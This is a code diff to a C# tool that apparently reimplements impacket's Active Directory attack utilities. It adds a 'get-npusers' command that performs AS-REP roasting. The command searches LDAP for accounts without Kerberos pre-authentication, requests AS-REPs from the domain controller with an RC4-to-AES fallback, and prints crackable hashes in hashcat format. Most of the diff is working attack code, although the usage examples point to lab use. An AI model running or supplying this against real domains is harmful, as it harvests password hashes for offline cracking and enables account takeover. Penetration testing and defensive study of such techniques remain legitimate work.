@@ -1,6 +1,7 @@
 using DotNetPacket.Core;
 using DotNetPacket.Protocols.Dcerpc;
 using DotNetPacket.Protocols.Gpp;
+using DotNetPacket.Protocols.Krb5;
 using DotNetPacket.Protocols.Laps;
 using DotNetPacket.Protocols.Ldap;
 using DotNetPacket.Protocols.Ntlm;
@@ -839,6 +840,109 @@ switch (args[0])
         Console.WriteLine(found == 0
             ? "No LAPS passwords returned (no LAPS attributes populated / not readable)."
             : $"{found} LAPS password(s).");
+        return 0;
+    }
+
+    case "get-npusers":
+    {
+        // GetNPUsers.py (AS-REP roasting): find accounts with "do not require Kerberos
+        // pre-authentication" (UF_DONT_REQUIRE_PREAUTH) and request an AS-REP for each — a DC
+        // returns the TGT enc-part encrypted with the account's key, i.e. a crackable hash.
+        // With a target user, roast just that one; otherwise LDAP-search for roastable accounts.
+        if (args.Length < 5)
+        {
+            Console.Error.WriteLine("usage: get-npusers <host> <user> <password> <domain-fqdn> [target-user] [port]");
+            Console.Error.WriteLine("  e.g. get-npusers 127.0.0.1 Administrator 'LabAdm1n!Pass' lab.local");
+            Console.Error.WriteLine("       get-npusers 127.0.0.1 '' '' lab.local roastme   # roast a single known user, no bind");
+            return 2;
+        }
+
+        string host = args[1];
+        string bindUser = args[2];
+        string bindPassword = args[3];
+        string domainFqdn = args[4];
+        string? targetUser = null;
+        int ldapPort = 389;
+        foreach (string a in args.Skip(5))
+        {
+            if (int.TryParse(a, out int p)) ldapPort = p;
+            else targetUser = a;
+        }
+
+        string realm = domainFqdn.ToUpperInvariant();
+
+        // Roast one account: AS-REQ (RC4, falling back to AES) -> AS-REP hash or a KRB-ERROR reason.
+        static void Roast(string kdcHost, string realm, string account)
+        {
+            uint nonce = (uint)(Random.Shared.Next() & 0x7FFFFFFF);
+            DateTimeOffset till = DateTimeOffset.UtcNow.AddDays(1);
+
+            byte[] reply = KerberosTcpClient.SendReceive(kdcHost, AsReq.Build(realm, account, nonce, till));
+            KerberosResponse resp = KerberosResponse.Parse(reply);
+
+            // RC4 disabled? Retry asking for AES, like impacket.
+            if (!resp.IsAsRep && resp.ErrorCode == Krb5Constants.KdcErrEtypeNoSupp)
+            {
+                byte[] aesReq = AsReq.Build(realm, account, nonce, till,
+                    new[] { Krb5Constants.Aes256CtsHmacSha1, Krb5Constants.Aes128CtsHmacSha1 });
+                resp = KerberosResponse.Parse(KerberosTcpClient.SendReceive(kdcHost, aesReq));
+            }
+
+            if (resp.IsAsRep)
+            {
+                Console.WriteLine(AsRepRoast.Hashcat(resp.EncPartEtype, account, realm, resp.EncPartCipher));
+            }
+            else
+            {
+                Console.Error.WriteLine($"[-] {account}: {Krb5Constants.DescribeError(resp.ErrorCode)}");
+            }
+        }
+
+        if (targetUser is not null)
+        {
+            Console.WriteLine($"Roasting {targetUser}@{realm} via KDC {host}:88 (GetNPUsers.py)");
+            Roast(host, realm, targetUser);
+            return 0;
+        }
+
+        // Discover roastable accounts: DONT_REQ_PREAUTH set, not disabled, not a computer.
+        const int UF_DONT_REQUIRE_PREAUTH = 0x400000;
+        const int UF_ACCOUNTDISABLE = 0x000002;
+        string baseDn = "dc=" + domainFqdn.Replace(".", ",dc=");
+        string bindName = bindUser.Contains('@') ? bindUser : $"{bindUser}@{domainFqdn}";
+
+        using LdapConnection ldap = LdapConnection.Connect(host, ldapPort);
+        LdapBindResponse bind = ldap.SimpleBind(bindName, bindPassword);
+        if (!bind.Success)
+        {
+            Console.Error.WriteLine($"Bind failed (result {bind.ResultCode}): {bind.DiagnosticMessage}");
+            return 1;
+        }
+
+        LdapFilter filter = LdapFilter.AllOf(
+            LdapFilter.Extensible("1.2.840.113556.1.4.803", "userAccountControl", UF_DONT_REQUIRE_PREAUTH.ToString()),
+            LdapFilter.Negate(LdapFilter.Extensible("1.2.840.113556.1.4.803", "userAccountControl", UF_ACCOUNTDISABLE.ToString())),
+            LdapFilter.Negate(LdapFilter.Equal("objectCategory", "computer")));
+        IReadOnlyList<SearchEntry> entries = ldap.Search(baseDn, filter,
+            new[] { "sAMAccountName", "userAccountControl" });
+
+        Console.WriteLine($"Querying {host} ({baseDn}) for accounts without Kerberos pre-auth (GetNPUsers.py)");
+        Console.WriteLine();
+        if (entries.Count == 0)
+        {
+            Console.WriteLine("No accounts with UF_DONT_REQUIRE_PREAUTH found.");
+            return 0;
+        }
+
+        foreach (SearchEntry e in entries)
+        {
+            string sam = e.Get("sAMAccountName");
+            if (!string.IsNullOrEmpty(sam))
+            {
+                Roast(host, realm, sam);
+            }
+        }
+
         return 0;
     }
 
@@ -3142,6 +3246,7 @@ static void PrintUsage()
     Console.WriteLine("  get-adcomputers <host> <user> <password> <domain-fqdn> [port]   # GetADComputers: LDAP search for computer objects");
     Console.WriteLine("  get-adusers <host> <user> <password> <domain-fqdn> [all] [port]   # GetADUsers: LDAP search for user accounts");
     Console.WriteLine("  get-laps <host> <user> <password> <domain-fqdn> [computer] [port]   # GetLAPSPassword: LDAP search for LAPS passwords");
+    Console.WriteLine("  get-npusers <host> <user> <password> <domain-fqdn> [target-user] [port]   # GetNPUsers: AS-REP roast accounts without pre-auth");
     Console.WriteLine("  ldap-signing <host> <domain> [port]   # CheckLDAPStatus (does the DC require LDAP signing)");
     Console.WriteLine("  rpc-dump-tcp <host> [port]");
     Console.WriteLine("                   Same, but DCERPC directly over TCP (ncacn_ip_tcp) to the endpoint mapper.");
